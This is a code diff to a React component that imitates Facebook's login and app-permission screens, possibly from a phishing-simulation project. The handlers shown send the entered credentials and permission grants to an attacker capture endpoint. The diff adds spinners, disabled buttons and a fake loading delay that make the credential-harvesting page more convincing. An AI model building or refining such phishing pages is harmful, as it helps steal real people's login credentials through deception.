@@ -15,6 +15,7 @@ function FakeFacebookContent() {
   const [showPermissions, setShowPermissions] = useState(false)
   const [loginAttempts, setLoginAttempts] = useState(0)
   const [showSuccess, setShowSuccess] = useState(false)
+  const [isLoading, setIsLoading] = useState(false)
   const searchParams = useSearchParams()
 
   useEffect(() => {
@@ -63,6 +64,8 @@ function FakeFacebookContent() {
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault()
     
+    setIsLoading(true)
+    
     // Send complete login attempt to attacker
     await fetch(getAttackerApiUrl('capture'), {
       method: 'POST',
@@ -81,6 +84,10 @@ function FakeFacebookContent() {
       })
     }).catch(console.error)
 
+    // Simulate loading delay
+    await new Promise(resolve => setTimeout(resolve, 1500))
+    
+    setIsLoading(false)
     setLoginAttempts(prev => prev + 1)
 
     // Show permissions dialog after first attempt
@@ -93,6 +100,8 @@ function FakeFacebookContent() {
   }
 
   const handlePermissionGrant = async () => {
+    setIsLoading(true)
+    
     // Send permission grant to attacker
     await fetch(getAttackerApiUrl('capture'), {
       method: 'POST',
@@ -183,13 +192,25 @@ function FakeFacebookContent() {
           <div className="space-y-3">
             <button 
               onClick={handlePermissionGrant}
-              className="w-full bg-[#1877f2] text-white py-3 rounded-lg font-semibold hover:bg-[#166fe5]"
+              disabled={isLoading}
+              className="w-full bg-[#1877f2] text-white py-3 rounded-lg font-semibold hover:bg-[#166fe5] disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center"
             >
-              Continue as {formData.email.split('@')[0] || 'User'}
+              {isLoading ? (
+                <>
+                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                  </svg>
+                  Granting permissions...
+                </>
+              ) : (
+                `Continue as ${formData.email.split('@')[0] || 'User'}`
+              )}
             </button>
             <button 
               onClick={handlePermissionDeny}
-              className="w-full bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-300"
+              disabled={isLoading}
+              className="w-full bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-300 disabled:opacity-50 disabled:cursor-not-allowed"
             >
               Cancel
             </button>
@@ -271,9 +292,20 @@ function FakeFacebookContent() {
 
           <button
             type="submit"
-            className="w-full bg-[#1877f2] text-white py-3 rounded-lg font-semibold hover:bg-[#166fe5] transition-colors"
+            disabled={isLoading}
+            className="w-full bg-[#1877f2] text-white py-3 rounded-lg font-semibold hover:bg-[#166fe5] transition-colors disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center"
           >
-            Log in
+            {isLoading ? (
+              <>
+                <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+                Logging in...
+              </>
+            ) : (
+              'Log in'
+            )}
           </button>
         </form>
 
